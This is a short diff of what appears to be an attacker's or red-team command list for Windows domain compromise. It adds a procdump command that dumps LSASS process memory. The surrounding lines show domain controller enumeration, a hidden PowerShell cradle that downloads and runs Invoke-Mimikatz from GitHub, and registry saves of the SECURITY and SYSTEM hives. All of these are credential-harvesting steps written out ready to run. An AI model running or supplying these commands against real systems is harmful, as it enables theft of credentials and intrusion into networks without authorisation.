@@ -366,6 +366,8 @@ nltest /dclist:abc.local
 ECHO ============================
 cmd.exe /c powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"
 ECHO ============================
+procdump.exe -ma lsass.exe C:\Users\Administrator\Desktop\x64\lsass.dmp
+ECHO ============================
 reg save HKLM\Security security.hive
 ECHO ============================
 reg save HKLM\System system.hive
